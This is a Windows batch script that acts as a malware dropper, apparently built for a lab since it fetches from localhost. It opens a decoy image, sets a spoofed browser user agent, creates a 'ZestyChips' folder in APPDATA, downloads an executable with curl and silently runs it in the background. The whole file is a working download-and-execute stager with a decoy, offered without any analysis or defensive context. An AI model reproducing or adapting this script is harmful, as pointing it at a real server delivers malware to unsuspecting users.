@echo off
setlocal

:: open the decoy
start "" "./bird2.jpg.png"

:: useragent
set UserAgent=Mozilla/5.0 (Windows NT 10.0; Wln64; x64; rv:121.0) Gecko/20100101 Firefox/121.0

:: create folder in APPDATA
set ZestyChipsFolder=%APPDATA%\ZestyChips
mkdir "%ZestyChipsFolder%"

:: download the file to APPDATA
curl -A "%UserAgent%" -o "%ZestyChipsFolder%\ZestyChipsFromURL.exe" http://localhost/index.php

:: execute in background
start /b "" "%ZestyChipsFolder%\ZestyChipsFromURL.exe"

endlocal